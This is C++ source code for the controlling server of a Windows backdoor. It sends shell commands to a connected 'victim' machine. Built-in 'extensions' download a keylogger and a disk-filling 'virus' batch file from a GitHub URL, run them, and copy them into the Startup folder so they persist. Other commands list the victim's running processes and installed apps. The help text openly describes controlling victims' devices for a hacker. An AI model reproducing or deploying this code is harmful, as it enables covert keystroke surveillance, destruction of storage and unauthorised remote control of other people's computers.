#include <iostream>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015

string Additions(char *buffer);
// Extensions Function:
string CE_InfoExt(string buffer);
string CE_RunExt(string buffer);
string CE_StartupExt(string buffer);
string CE_StopExt(string buffer);

int strincludes(char *strVar, char *buffer);

string cin_string();

int main()
{

    // Initialze wonsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOK = WSAStartup(ver, &wsData);

    if (wsOK != 0)
    {
        cerr << "[ERR] - Can't initialze winsock ! ... Quitting" << endl;
        return 1;
    }

    // create a socket
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    char *optval;

    if (listening == INVALID_SOCKET)
    {
        cerr << "[ERR] - Can't create a socket ! ... Quitting" << endl;
        return 1;
    }

    if (setsockopt(listening, SOL_SOCKET, SO_REUSEADDR, optval, sizeof(optval)) < 0)
    {
        printf("[ERR] - Error Setting TCP Sockte Options!\n");
        return 1;
    }

    // bind the socket to an ip address and port to a socket
    sockaddr_in hint;

    hint.sin_family = AF_INET;
    hint.sin_port = htons(DEFAULT_PORT);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; // Could also use inet_pton

    bind(listening, (sockaddr *)&hint, sizeof(hint));

    // tell winsock the socket is for listening
    listen(listening, SOMAXCONN);

    // wait for a connection
    sockaddr_in client;
    int clientSize = sizeof(client);

    SOCKET clientSocket = accept(listening, (sockaddr *)&client, &clientSize);

    // while loop -> accept and echo message back to client
    char buffer[DEFAULT_BUFLEN];
    char response[DEFAULT_TOTALE_BUFLEN];

    while (true)
    {
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(response, sizeof(response));

        cout << "[SHELL] - # " << inet_ntoa(client.sin_addr) << " ~ $ ";

        fgets(buffer, sizeof(buffer), stdin);
        // buffer = cin_string();

        strtok(buffer, "\n");

        strcpy(buffer, Additions(buffer).c_str());
        cout << "[BUFF] - " << buffer << endl;

        strtok(buffer, "\n");

        int bytesSend = send(clientSocket, buffer, sizeof(buffer), 0);

        if (buffer == "q")
        {
            break;
        }
        else
        {
            // wait for client to send data
            int bytesRecv = recv(clientSocket, response, sizeof(response), 0x8);

            if (bytesRecv == SOCKET_ERROR)
            {
                cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
                break;
            }

            if (bytesRecv == 0)
            {
                cout << "[ERR] - Client disconnected " << endl;
                break;
            }

            cout << response;
        }
    }
}

string cin_string()
{
    char input[1024];
    cin.getline(input, 1024);
    return input;
}

int strincludes(char *strVar, char *buffer)
{
    char *str;
    char *buf;
    strcpy(str, strVar);
    strcpy(buf, buffer);
    if (!str || !buf)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        // printf("%s --- %s\n", buf, token);
        if (strcmp(buf, token) == 0)
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
    return 0;
}

string Additions(char *buffer)
{

    string obuf = buffer;

    if (obuf.find("apps_list ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running";
        }
        else if (obuf.find("run") != string::npos)
        {
            if (obuf.find("all") != string::npos)
            {
                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
            else
            {
                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
        }
        else if (obuf.find("all") != string::npos)
        {
            obuf = "powershell -Command \"Get-AppxPackage\"";
        }
    }
    else if (obuf.find("ext ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = CE_InfoExt(obuf);
        }
        else if (obuf.find("run") != string::npos)
        {
            obuf = CE_RunExt(obuf);
        }
        else if (obuf.find("startup") != string::npos)
        {
            obuf = CE_StartupExt(obuf);
        }
        else if (obuf.find("stop") != string::npos)
        {
            obuf = CE_StopExt(obuf);
        }
    }
    return obuf;
}

/*
######################################
            Extensions
######################################
*/
string CE_InfoExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog \n";
        ebuf += "[ $ ] - Available Commands : \n";
        ebuf += "[ $ ext run keylog ] ->  for start recording \n";
        ebuf += "[ $ ext info keylog ] -> show some info for keylog component\n";
        ebuf += "[ $ ext reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device \n";
        ebuf += "[ $ ] - Available Commands : \n";
        ebuf += "[ $ ext run fill_storage ] ->  for start fill storage \n";
        ebuf += "[ $ ext startup fill_storage ] -> copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\n";
        ebuf += "[ $ ext info fill_storage ] -> show some info for fill_storage component\n";
    }
    else
    {
        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable extensions :\n--> keylog\n--> fill_storage\n--> network";
    }

    return ebuf;
}

string CE_RunExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";

    if (ebuf.find("keylog") != string::npos)
    {
        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
        ebuf = command;
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[EXT] [RUN] - fill_storage component ..";
        ebuf = command;
    }
    else
    {
        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
    }

    return ebuf;
}


string CE_StartupExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";

    if (ebuf.find("keylog") != string::npos)
    {
        command += "IF NOT EXIST C:\\ProgramData\\Ms\\keylogger.exe ( curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( move C:\\ProgramData\\Ms\\keylogger.exe C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup  ) ELSE ( echo; )";
        if (ebuf.find("run") != string::npos) {
            command += " && IF EXIST C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe ( start C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe )";
        }
        command += " && echo \n[EXT] [DOWNLOAD] - keylogger.exe component \n[EXT] [RUN] - keylog component .. ";
        ebuf = command;
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[CMP] [RUN] - fill_storage component ..";
        ebuf = command;
    }
    else
    {
        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
    }

    return ebuf;
}

string CE_StopExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\"";
    }

    return ebuf;
}

// echo "# backdoor" >> README.md
// git init
// git add README.md
// git commit -m "first commit"
// git branch -M main
// git remote add origin https://github.com/s3q/backdoor.git
// git push -u origin main